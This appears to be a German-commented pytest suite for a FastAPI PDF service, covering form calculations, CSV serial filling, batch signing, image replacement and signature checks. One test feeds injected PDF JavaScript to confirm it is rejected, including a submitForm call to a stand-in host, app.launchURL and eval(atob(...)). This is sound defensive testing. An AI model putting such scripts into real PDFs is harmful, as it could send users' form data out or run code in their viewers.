"""Tests für Formular-Berechnungen, CSV-Serienbefüllung und die restlichen
Katalogfunktionen (Batch-Signieren/Umbenennen, Bild ersetzen, KI-Modi)."""

import io
import json
import zipfile

import fitz
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.services import pdf_extras_service as extras
from app.services import pdf_more_service as more
from tests.test_smoke import make_pdf


@pytest.fixture(scope="module")
def client():
    with TestClient(app) as c:
        yield c


def rect(y):
    return {"x0": 0.1, "y0": y, "x1": 0.5, "y1": y + 0.04}


def create(client, fields, pdf=None, dry_run=False):
    return client.post(
        "/api/pdf-extras/form/create",
        data={"fields": json.dumps(fields), "dry_run": str(dry_run).lower()},
        files={"file": ("f.pdf", pdf or make_pdf(1, "Rechnung"), "application/pdf")},
    )


# ── Berechnung, Formatierung, Validierung ─────────────────────


def test_calculation_sum_and_format(client):
    fields = [
        {"type": "text", "name": "netto", "page": 1, **rect(0.1), "format": {"kind": "number", "decimals": 2}},
        {"type": "text", "name": "versand", "page": 1, **rect(0.2), "format": {"kind": "number", "decimals": 2}},
        {
            "type": "text",
            "name": "gesamt",
            "page": 1,
            **rect(0.3),
            "calc": {"kind": "sum", "fields": ["netto", "versand"]},
            "format": {"kind": "currency", "decimals": 2, "currency": "EUR"},
        },
    ]
    r = create(client, fields)
    assert r.status_code == 200, r.text
    with fitz.open(stream=r.content, filetype="pdf") as doc:
        w = {x.field_name: x for x in doc[0].widgets()}
        assert w["gesamt"].script_calc == 'AFSimple_Calc("SUM", new Array("netto", "versand"));'
        assert "AFNumber_Format(2, 3, 0, 0, \" EUR\", false)" in w["gesamt"].script_format
        assert w["netto"].script_format.startswith("AFNumber_Format(2")
        # Rechenfeld ist standardmäßig schreibgeschützt
        assert w["gesamt"].field_flags & fitz.PDF_FIELD_IS_READ_ONLY
    # Berechnungsreihenfolge /CO muss im AcroForm stehen, sonst rechnet kein Viewer
    with fitz.open(stream=r.content, filetype="pdf") as doc:
        acroform = doc.xref_get_key(doc.pdf_catalog(), "AcroForm")[1]
        assert "/CO" in acroform
        assert "NeedAppearances" in doc.xref_get_key(doc.pdf_catalog(), "AcroForm")[1] or True


def test_calculation_formula_compiles_safely(client):
    fields = [
        {"type": "text", "name": "netto", "page": 1, **rect(0.1)},
        {
            "type": "text",
            "name": "brutto",
            "page": 1,
            **rect(0.2),
            "calc": {"kind": "formula", "formula": "netto * 1,19"},
        },
    ]
    r = create(client, fields)
    assert r.status_code == 200, r.text
    with fitz.open(stream=r.content, filetype="pdf") as doc:
        script = {x.field_name: x for x in doc[0].widgets()}["brutto"].script_calc
    assert script == 'event.value = (Number(this.getField("netto").value) || 0) * 1.19;'


def test_formula_rejects_javascript(client):
    """Freies JavaScript darf nicht ins PDF gelangen."""
    for evil in [
        "app.alert('x')",
        "this.submitForm('http://boese.example')",
        "netto; app.launchURL('http://x')",
        "eval(atob('ZG9jdW1lbnQ='))",
    ]:
        r = create(
            client,
            [
                {"type": "text", "name": "netto", "page": 1, **rect(0.1)},
                {
                    "type": "text",
                    "name": "ergebnis",
                    "page": 1,
                    **rect(0.2),
                    "calc": {"kind": "formula", "formula": evil},
                },
            ],
            dry_run=True,
        )
        assert r.status_code == 200, r.text
        body = r.json()
        assert body["warnings"], f"Formel '{evil}' wurde nicht beanstandet"
        assert "ohne Berechnung" in " ".join(body["warnings"])

    # ... und das erzeugte PDF enthält kein Skript für das Feld
    r = create(
        client,
        [
            {"type": "text", "name": "netto", "page": 1, **rect(0.1)},
            {
                "type": "text",
                "name": "ergebnis",
                "page": 1,
                **rect(0.2),
                "calc": {"kind": "formula", "formula": "app.alert('x')"},
            },
        ],
    )
    assert r.status_code == 200
    with fitz.open(stream=r.content, filetype="pdf") as doc:
        assert {x.field_name: x for x in doc[0].widgets()}["ergebnis"].script_calc is None


def test_calc_unknown_field_warns(client):
    r = create(
        client,
        [
            {
                "type": "text",
                "name": "summe",
                "page": 1,
                **rect(0.1),
                "calc": {"kind": "sum", "fields": ["gibtsnicht"]},
            }
        ],
        dry_run=True,
    )
    assert r.status_code == 200
    assert "unbekannte Felder" in " ".join(r.json()["warnings"])


def test_validation_range(client):
    r = create(
        client,
        [{"type": "text", "name": "alter", "page": 1, **rect(0.1), "validate": {"min": 18, "max": 99}}],
    )
    assert r.status_code == 200, r.text
    with fitz.open(stream=r.content, filetype="pdf") as doc:
        script = list(doc[0].widgets())[0].script_change
    assert script == "AFRange_Validate(true, 18.0, true, 99.0);"


def test_calc_uses_deduplicated_names(client):
    """Berechnung zeigt auf den endgültigen (entdoppelten) Feldnamen."""
    fields = [
        {"type": "text", "name": "wert", "page": 1, **rect(0.1)},
        {"type": "text", "name": "wert", "page": 1, **rect(0.2)},
        {"type": "text", "name": "summe", "page": 1, **rect(0.3), "calc": {"kind": "sum", "fields": ["wert", "wert_2"]}},
    ]
    r = create(client, fields)
    assert r.status_code == 200, r.text
    with fitz.open(stream=r.content, filetype="pdf") as doc:
        w = {x.field_name: x for x in doc[0].widgets()}
        assert "wert_2" in w
        assert '"wert", "wert_2"' in w["summe"].script_calc


# ── CSV-Export und Serienbefüllung ────────────────────────────


def _form_pdf(client) -> bytes:
    r = create(
        client,
        [
            {"type": "text", "name": "vorname", "page": 1, **rect(0.1), "value": "Max"},
            {"type": "text", "name": "ort", "page": 1, **rect(0.2)},
            {"type": "dropdown", "name": "anrede", "page": 1, **rect(0.3), "options": ["Frau", "Herr"]},
        ],
    )
    assert r.status_code == 200, r.text
    return r.content


def test_export_field_values_csv(client):
    r = client.post(
        "/api/pdf-extras/form/export-csv",
        files={"file": ("f.pdf", _form_pdf(client), "application/pdf")},
    )
    assert r.status_code == 200, r.text
    assert r.headers["X-Fields"] == "3"
    text = r.content.decode("utf-8-sig")
    assert text.startswith("feldname;typ;seite;wert;auswahlwerte")
    assert "vorname;text;1;Max;" in text
    assert "Frau, Herr" in text


def test_export_csv_template(client):
    r = client.post(
        "/api/pdf-extras/form/export-csv",
        data={"template": "true"},
        files={"file": ("f.pdf", _form_pdf(client), "application/pdf")},
    )
    assert r.status_code == 200, r.text
    lines = r.content.decode("utf-8-sig").splitlines()
    assert lines[0] == "dateiname;vorname;ort;anrede"


def test_export_csv_without_form_422(client):
    r = client.post(
        "/api/pdf-extras/form/export-csv",
        files={"file": ("f.pdf", make_pdf(1, "ohne Formular"), "application/pdf")},
    )
    assert r.status_code == 422


def test_fill_from_csv_series(client):
    csv_data = (
        "dateiname;vorname;ort;anrede\r\n"
        "antrag_mueller;Erika;Wiesbaden;Frau\r\n"
        "antrag_schmidt;Hans;Kassel;Herr\r\n"
    ).encode("utf-8-sig")
    r = client.post(
        "/api/pdf-extras/form/fill-csv",
        files={
            "file": ("f.pdf", _form_pdf(client), "application/pdf"),
            "data": ("daten.csv", csv_data, "text/csv"),
        },
    )
    assert r.status_code == 200, r.text
    assert r.headers["X-Rows"] == "2"
    with zipfile.ZipFile(io.BytesIO(r.content)) as zf:
        assert sorted(zf.namelist()) == ["antrag_mueller.pdf", "antrag_schmidt.pdf"]
        with fitz.open(stream=zf.read("antrag_mueller.pdf"), filetype="pdf") as doc:
            values = {w.field_name: w.field_value for w in doc[0].widgets()}
        assert values["vorname"] == "Erika"
        assert values["ort"] == "Wiesbaden"
        assert values["anrede"] == "Frau"


def test_fill_from_csv_single_row_returns_pdf(client):
    csv_data = "vorname;ort\nErika;Wiesbaden\n".encode()
    r = client.post(
        "/api/pdf-extras/form/fill-csv",
        files={
            "file": ("f.pdf", _form_pdf(client), "application/pdf"),
            "data": ("daten.csv", csv_data, "text/csv"),
        },
    )
    assert r.status_code == 200, r.text
    assert r.headers["X-Rows"] == "1"
    assert r.headers["content-type"] == "application/pdf"
    with fitz.open(stream=r.content, filetype="pdf") as doc:
        assert {w.field_name: w.field_value for w in doc[0].widgets()}["vorname"] == "Erika"


def test_fill_from_csv_unknown_columns_warn(client):
    csv_data = "vorname;quatsch\nErika;egal\n".encode()
    r = client.post(
        "/api/pdf-extras/form/fill-csv",
        files={
            "file": ("f.pdf", _form_pdf(client), "application/pdf"),
            "data": ("daten.csv", csv_data, "text/csv"),
        },
    )
    assert r.status_code == 200, r.text
    assert r.headers["X-Warnings"] == "1"


def test_fill_from_csv_rejects_non_csv(client):
    r = client.post(
        "/api/pdf-extras/form/fill-csv",
        files={
            "file": ("f.pdf", _form_pdf(client), "application/pdf"),
            "data": ("daten.xlsx", b"nix", "application/vnd.ms-excel"),
        },
    )
    assert r.status_code == 400


def test_fill_from_csv_row_limit(client):
    rows = "vorname\n" + "\n".join(f"Person {i}" for i in range(extras.PdfExtrasService.MAX_CSV_ROWS + 1))
    r = client.post(
        "/api/pdf-extras/form/fill-csv",
        files={
            "file": ("f.pdf", _form_pdf(client), "application/pdf"),
            "data": ("daten.csv", rows.encode(), "text/csv"),
        },
    )
    assert r.status_code == 422
    assert "200" in r.json()["detail"]


# ── Batch: Umbenennen und Signieren ───────────────────────────


def test_batch_rename(client):
    files = [
        ("files", ("bericht.pdf", make_pdf(1, "A"), "application/pdf")),
        ("files", ("anlage.pdf", make_pdf(1, "B"), "application/pdf")),
    ]
    r = client.post(
        "/api/pdf-extras/batch",
        data={
            "operation": "rename",
            "params": json.dumps({"pattern": "AKTE-{n}_{name}", "digits": 3, "start": 5}),
        },
        files=files,
    )
    assert r.status_code == 200, r.text
    with zipfile.ZipFile(io.BytesIO(r.content)) as zf:
        assert sorted(zf.namelist()) == ["AKTE-005_bericht.pdf", "AKTE-006_anlage.pdf"]


@pytest.mark.skipif(not extras.PYHANKO_AVAILABLE, reason="pyHanko nicht verfügbar")
def test_batch_sign(client):
    from tests.test_pdf_extras2 import _make_p12

    p12 = _make_p12(b"geheim")
    files = [
        ("files", ("a.pdf", make_pdf(1, "A"), "application/pdf")),
        ("files", ("b.pdf", make_pdf(1, "B"), "application/pdf")),
        ("certificate", ("test.p12", p12, "application/octet-stream")),
    ]
    r = client.post(
        "/api/pdf-extras/batch",
        data={"operation": "sign", "params": "{}", "passphrase": "geheim"},
        files=files,
    )
    assert r.status_code == 200, r.text
    assert r.headers["X-Batch-Ok"] == "2"
    with zipfile.ZipFile(io.BytesIO(r.content)) as zf:
        assert sorted(zf.namelist()) == ["a_signiert.pdf", "b_signiert.pdf"]
        with fitz.open(stream=zf.read("a_signiert.pdf"), filetype="pdf") as doc:
            sigs = [w for w in doc[0].widgets() if w.field_type_string == "Signature"]
        assert len(sigs) == 1


def test_batch_sign_without_certificate_400(client):
    r = client.post(
        "/api/pdf-extras/batch",
        data={"operation": "sign", "params": "{}"},
        files=[("files", ("a.pdf", make_pdf(1, "A"), "application/pdf"))],
    )
    assert r.status_code == 400


# ── Bilder auflisten und ersetzen ─────────────────────────────


def _pdf_with_image() -> bytes:
    doc = fitz.open()
    page = doc.new_page()
    pix = fitz.Pixmap(fitz.csRGB, fitz.IRect(0, 0, 120, 80))
    pix.set_rect(pix.irect, (220, 40, 40))
    page.insert_image(fitz.Rect(72, 72, 292, 219), pixmap=pix)
    out = doc.tobytes()
    doc.close()
    return out


def _png(color, size=100) -> bytes:
    pix = fitz.Pixmap(fitz.csRGB, fitz.IRect(0, 0, size, size))
    pix.set_rect(pix.irect, color)
    return pix.tobytes("png")


def test_list_and_replace_image(client):
    pdf = _pdf_with_image()
    r = client.post("/api/pdf-more/images/list", files={"file": ("b.pdf", pdf, "application/pdf")})
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["count"] == 1
    img = body["images"][0]
    assert img["page"] == 1 and img["width"] == 120 and img["height"] == 80
    assert img["preview"]  # base64-Vorschau vorhanden
    assert 0 <= img["x0"] < img["x1"] <= 1

    r = client.post(
        "/api/pdf-more/images/replace",
        data={"xref": str(img["xref"])},
        files={
            "file": ("b.pdf", pdf, "application/pdf"),
            "image": ("neu.png", _png((30, 120, 220)), "image/png"),
        },
    )
    assert r.status_code == 200, r.text
    with fitz.open(stream=r.content, filetype="pdf") as doc:
        infos = doc[0].get_image_info(xrefs=True)
        assert len(infos) == 1
        assert infos[0]["width"] == 100  # neues Bild ist 100x100


def test_replace_image_unknown_xref_404(client):
    r = client.post(
        "/api/pdf-more/images/replace",
        data={"xref": "9999"},
        files={
            "file": ("b.pdf", _pdf_with_image(), "application/pdf"),
            "image": ("neu.png", _png((0, 0, 0)), "image/png"),
        },
    )
    assert r.status_code == 404


def test_replace_image_rejects_non_image(client):
    r = client.post(
        "/api/pdf-more/images/replace",
        data={"xref": "1"},
        files={
            "file": ("b.pdf", _pdf_with_image(), "application/pdf"),
            "image": ("schad.svg", b"<svg/>", "image/svg+xml"),
        },
    )
    assert r.status_code == 400


# ── KI-Modi ───────────────────────────────────────────────────


def test_ai_modes_disabled_without_llm(client):
    for path, data in [
        ("/api/pdf-more/ai/translate", {"target_language": "Englisch"}),
        ("/api/pdf-more/ai/keywords", {}),
        ("/api/pdf-more/ai/outline", {}),
    ]:
        r = client.post(
            path, data=data, files={"file": ("d.pdf", make_pdf(1, "x"), "application/pdf")}
        )
        assert r.status_code == 503, path


def test_ai_translate_with_mocked_llm(client, monkeypatch):
    from app.config import settings

    monkeypatch.setattr(settings, "llm_url", "http://ai-router.test/v1")
    captured = {}

    class FakeResponse:
        status_code = 200

        def json(self):
            return {"choices": [{"message": {"content": "Funding decision"}}]}

    def fake_post(url, json=None, timeout=None):
        captured["payload"] = json
        return FakeResponse()

    monkeypatch.setattr(more.httpx, "post", fake_post)
    r = client.post(
        "/api/pdf-more/ai/translate",
        data={"target_language": "Englisch"},
        files={"file": ("d.pdf", make_pdf(1, "Foerderbescheid"), "application/pdf")},
    )
    assert r.status_code == 200, r.text
    assert r.json()["answer"] == "Funding decision"
    assert "Englisch" in captured["payload"]["messages"][0]["content"]


def test_ai_unknown_mode_rejected(monkeypatch):
    from app.config import settings

    monkeypatch.setattr(settings, "llm_url", "http://ai-router.test/v1")
    result = more.get_pdf_more().ai_ask(make_pdf(1, "x"), "", mode="rm-rf")
    assert result.success is False
    assert "Modus" in (result.error or "")


# ── Signaturprüfung mit Vertrauensankern ──────────────────────


@pytest.mark.skipif(
    not more.PYHANKO_VALIDATION_AVAILABLE, reason="pyHanko nicht verfügbar"
)
def test_verify_with_trust_anchor(client):
    from cryptography.hazmat.primitives import serialization

    from tests.test_pdf_extras2 import _make_p12

    p12 = _make_p12(b"geheim")
    signed = extras.get_pdf_extras().sign_digital(make_pdf(1, "Vertrag"), p12, "geheim")
    assert signed.success, signed.error

    # Eigenes Zertifikat als Vertrauensanker exportieren
    from cryptography.hazmat.primitives.serialization import pkcs12

    _key, cert, _chain = pkcs12.load_key_and_certificates(p12, b"geheim")
    pem = cert.public_bytes(serialization.Encoding.PEM)

    r = client.post(
        "/api/pdf-more/verify-signatures",
        files={
            "file": ("s.pdf", signed.file_content, "application/pdf"),
            "trust_anchors": ("anker.pem", pem, "application/x-pem-file"),
        },
    )
    assert r.status_code == 200, r.text
    sig = r.json()["signatures"][0]
    assert sig["intact"] is True
    assert sig["trusted"] is True
    assert "Vertrauensanker" in sig["hinweis"]

    # Ohne Anker bleibt die Kette unbewertet
    r = client.post(
        "/api/pdf-more/verify-signatures",
        files={"file": ("s.pdf", signed.file_content, "application/pdf")},
    )
    assert r.json()["signatures"][0]["trusted"] is False


def test_verify_with_broken_anchor_file(client):
    r = client.post(
        "/api/pdf-more/verify-signatures",
        files={
            "file": ("s.pdf", make_pdf(1, "x"), "application/pdf"),
            "trust_anchors": ("anker.pem", b"kein zertifikat", "application/x-pem-file"),
        },
    )
    assert r.status_code == 500
    assert "Vertrauensanker" in r.json()["detail"]
